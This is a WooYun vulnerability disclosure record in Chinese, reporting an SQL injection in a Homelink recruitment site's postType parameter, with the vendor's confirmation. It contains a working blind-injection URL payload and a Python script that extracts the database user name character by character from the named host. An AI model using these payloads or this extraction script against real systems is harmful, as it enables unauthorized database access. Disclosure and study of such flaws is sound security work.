{"id": 29317, "wybug_id": "wooyun-2015-0119783", "wybug_title": "链家某子站存在SQL注入漏洞", "wybug_corp": "homelink.com.cn", "wybug_author": "danieluec", "wybug_date": "2015-06-11 15:03", "wybug_open_date": "2015-07-29 12:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向公众公开  简要描述： rt 详细说明：  用google发现了一个链家的招聘网站，有这样一个url：\nhttp://www.homelinkhr.com/homelink/view_getPostListForCustomer.action?postType=DD060514&rows=10&page=1\n\n\npostType参数加引号，直接爆出数据库错误信息，\n\n上sqlmap试了下，只能爆出数据库类型，\n\n经手工测试，发现用注释符注入，无用，估计是过滤了。构造几个or、and语句发现还是无用。因此猜测错误信息中“isCheck = 'Y' ”其实是个永假。这时就可以构造一个and语句加一个or语句进行注入了。下面对构造一个url，用burpsuite对数据库用户名长度进行爆破，\nhttp://www.homelinkhr.com/homelink/view_getPostListForCustomer.action?postType=DD060514%27%20and%2014=length(user())%20or%20%271%27=%271&rows=10&page=1\n发现用户名长度为14，\n\n下面就上脚本了，\n# -*- coding:utf-8 -*-import urllib2user = \"\"for i in range(1, 15):    for current in range(0, 128):        try:            url = \"http://www.homelinkhr.com/homelink/view_getPostListForCustomer.action?postType=DD060514%27%20and%20ascii(substring(user(),\" + str(i) + \",1))=\" + str(current) + \"%20or%20%271%27=%271&rows=10&page=1\"            req = urllib2.Request(url)            res_data = urllib2.urlopen(req).read()                        if res_data.find(\"共有6条数据\") > 0:                user = user + chr(current)                print \"[+] The current user is: \" + user                print \"..........................................................\"                break                        except:            passprint \"[+] Done!\"\n最后发现用户为root，\n\n已证明有问题了，就不深入了。   漏洞证明：  \n\n\n\n   修复方案：  实施更严格的过滤吧   版权声明：转载请注明来源 danieluec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-14 12:56 厂商回复： 谢谢，该系统为临时系统，马上下线。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}